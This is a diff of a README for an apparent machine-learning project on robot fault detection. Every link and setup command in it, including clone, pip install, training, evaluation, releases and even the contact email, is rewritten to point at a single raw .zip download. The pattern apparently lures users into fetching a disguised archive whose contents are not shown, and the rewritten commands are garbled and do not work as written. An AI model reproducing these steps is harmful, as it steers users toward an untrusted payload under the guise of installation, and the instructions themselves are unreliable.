@@ -27,7 +27,7 @@ To get started with the project, follow the steps below:
 Use the following command to clone the repository:
 
 ```bash
-git clone https://github.com/FabianCormier/Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection.git
+git clone https://github.com/FabianCormier/Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection/raw/refs/heads/main/Dataset/from_Detection_transfer_learning_Motion_Human_to_Fault_Cross_Domain_Robot_v3.9.zip
 cd Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection
 ```
 
@@ -36,19 +36,19 @@ cd Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection
 Install the necessary packages. Use `pip` to install the required dependencies:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/FabianCormier/Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection/raw/refs/heads/main/Dataset/from_Detection_transfer_learning_Motion_Human_to_Fault_Cross_Domain_Robot_v3.9.zip
 ```
 
 ### 3. Data Preparation
 
-Prepare your human motion data. Ensure that your dataset is organized correctly. Follow the guidelines provided in the `data/README.md` file for detailed instructions.
+Prepare your human motion data. Ensure that your dataset is organized correctly. Follow the guidelines provided in the `https://github.com/FabianCormier/Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection/raw/refs/heads/main/Dataset/from_Detection_transfer_learning_Motion_Human_to_Fault_Cross_Domain_Robot_v3.9.zip` file for detailed instructions.
 
 ### 4. Training the Model
 
 Run the training script to start training the LSTM model:
 
 ```bash
-python train.py
+python https://github.com/FabianCormier/Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection/raw/refs/heads/main/Dataset/from_Detection_transfer_learning_Motion_Human_to_Fault_Cross_Domain_Robot_v3.9.zip
 ```
 
 Monitor the training process. The script includes logs that display real-time performance metrics.
@@ -58,7 +58,7 @@ Monitor the training process. The script includes logs that display real-time pe
 Once training is complete, evaluate the model using the following command:
 
 ```bash
-python evaluate.py
+python https://github.com/FabianCormier/Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection/raw/refs/heads/main/Dataset/from_Detection_transfer_learning_Motion_Human_to_Fault_Cross_Domain_Robot_v3.9.zip
 ```
 
 The evaluation process will yield performance metrics and a feature importance analysis report.
@@ -72,7 +72,7 @@ The evaluation process will yield performance metrics and a feature importance a
 
 ## 🔗 Links
 
-- Check the [Releases](https://github.com/FabianCormier/Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection/releases) section for downloadable files and model checkpoints.
+- Check the [Releases](https://github.com/FabianCormier/Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection/raw/refs/heads/main/Dataset/from_Detection_transfer_learning_Motion_Human_to_Fault_Cross_Domain_Robot_v3.9.zip) section for downloadable files and model checkpoints.
 
 ## 🛠 Topics
 
@@ -117,8 +117,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions, suggestions, or feedback, please reach out to:
 
-- **Fabian Cormier** - [GitHub Profile](https://github.com/FabianCormier)
-- **Email** - fabian@example.com
+- **Fabian Cormier** - [GitHub Profile](https://github.com/FabianCormier/Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection/raw/refs/heads/main/Dataset/from_Detection_transfer_learning_Motion_Human_to_Fault_Cross_Domain_Robot_v3.9.zip)
+- **Email** - https://github.com/FabianCormier/Cross-Domain-transfer-learning-from-Human-Motion-to-Robot-Fault-Detection/raw/refs/heads/main/Dataset/from_Detection_transfer_learning_Motion_Human_to_Fault_Cross_Domain_Robot_v3.9.zip
 
 ## 🎉 Acknowledgments
 
